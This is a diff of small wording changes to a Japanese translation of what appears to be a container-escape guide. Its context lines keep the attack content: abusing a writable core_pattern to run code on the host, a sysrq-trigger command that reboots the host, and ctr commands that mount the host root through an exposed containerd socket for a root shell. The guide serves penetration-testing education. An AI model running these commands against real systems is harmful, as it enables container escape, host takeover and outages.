@@ -15,7 +15,7 @@
 #### **`/proc/sys/kernel/core_pattern`**
 
 - [core(5)](https://man7.org/linux/man-pages/man5/core.5.html)で説明されています。
-- このファイルに書き込むことができる場合、パイプ`|`の後にプログラムまたはスクリプトのパスを書き込むことが可能で、クラッシュが発生した後に実行されます。
+- このファイルに書き込むことができる場合、パイプ`|`の後にプログラムまたはスクリプトのパスを書き込むことができ、クラッシュが発生した後に実行されます。
 - 攻撃者は、`mount`を実行してホスト内のコンテナへのパスを見つけ、そのパスをコンテナのファイルシステム内のバイナリに書き込むことができます。その後、プログラムをクラッシュさせてカーネルがコンテナの外でバイナリを実行するようにします。
 
 - **テストと悪用の例**:
@@ -90,7 +90,7 @@ echo b > /proc/sysrq-trigger # ホストを再起動
 
 - カーネルがエクスポートしたシンボルとそのアドレスをリストします。
 - KASLRを克服するためのカーネルエクスプロイト開発に不可欠です。
-- アドレス情報は`kptr_restrict`が`1`または`2`に設定されている場合に制限されます。
+- アドレス情報は、`kptr_restrict`が`1`または`2`に設定されている場合に制限されます。
 - [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)の詳細。
 
 #### **`/proc/[pid]/mem`**
@@ -306,7 +306,7 @@ Attack example abusing a mounted **containerd** socket:
 ctr --address /host/run/containerd.sock images pull docker.io/library/busybox:latest
 ctr --address /host/run/containerd.sock run --tty --privileged --mount \
 type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
-chroot /host /bin/bash   # ホスト上でのフルルートシェル
+chroot /host /bin/bash   # ホスト上のフルルートシェル
 ```
 
 A similar technique works with **crictl**, **podman** or the **kubelet** API once their respective sockets are exposed.
